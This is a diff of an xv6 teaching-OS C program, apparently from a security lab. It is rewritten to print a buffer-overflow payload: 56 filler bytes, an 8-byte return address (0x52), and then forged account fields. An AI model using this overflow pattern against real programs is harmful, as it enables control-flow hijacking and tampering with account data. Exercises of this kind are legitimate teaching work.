@@ -1,21 +1,23 @@
 #include "kernel/types.h"
 #include "user/user.h"
-
 int
 main(void)
 {
-    char buffer[128];
-
-    memset(buffer, 'A', sizeof(buffer));
-
+        write(1,"AAAAAAAA",8);
+        write(1,"AAAAAAAA",8);
+        write(1,"AAAAAAAA",8);
+        write(1,"AAAAAAAA",8);
+        write(1,"AAAAAAAA",8);
+        write(1,"AAAAAAAA",8);
+        write(1,"AAAAAAAA",8);
+        write(1,"\x52\x00\x00\x00\x00\x00\x00\x00",8);
+        write(1,"\n",1);
     // Account information
-    char account[] = "John Smith\n100\n123456\n87654321\n";
+        write(1,"100\n",4);
+        write (1,"John Smith\n",11);
+        write(1,"123456\n",7);
+        write(1,"87654321\n",9);
+        write(1,"Y/n",2);
 
-    // Copy account information into the buffer
-    memmove(buffer, account, sizeof(account) - 1);
-
-    // Send bytes to standard output
-    write(1, buffer, sizeof(account) - 1);
-
-    exit(0);
+         exit(0);
 }
